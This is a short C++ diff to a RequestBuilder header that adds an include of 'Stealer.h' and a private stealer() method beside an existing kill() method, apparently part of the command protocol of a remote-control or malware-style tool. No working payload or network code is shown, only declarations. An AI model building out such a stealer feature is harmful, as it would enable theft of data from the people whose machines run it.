@@ -19,8 +19,10 @@
 #include <boost/core/noncopyable.hpp>
 
 #include "Protocol.h"
+
 #include "IRequest.h"
 #include "Kill.h"
+#include "Stealer.h"
 
 class RequestBuilder : private boost::noncopyable
 {
@@ -33,5 +35,7 @@ public:
 	std::unique_ptr<IRequest> create(PacketType type) const;
 private:
 	std::unique_ptr<IRequest> kill(void) const;
+	std::unique_ptr<IRequest> stealer(void) const;
+
 	std::unordered_map<PacketType, Cmds> _cmds;
 };
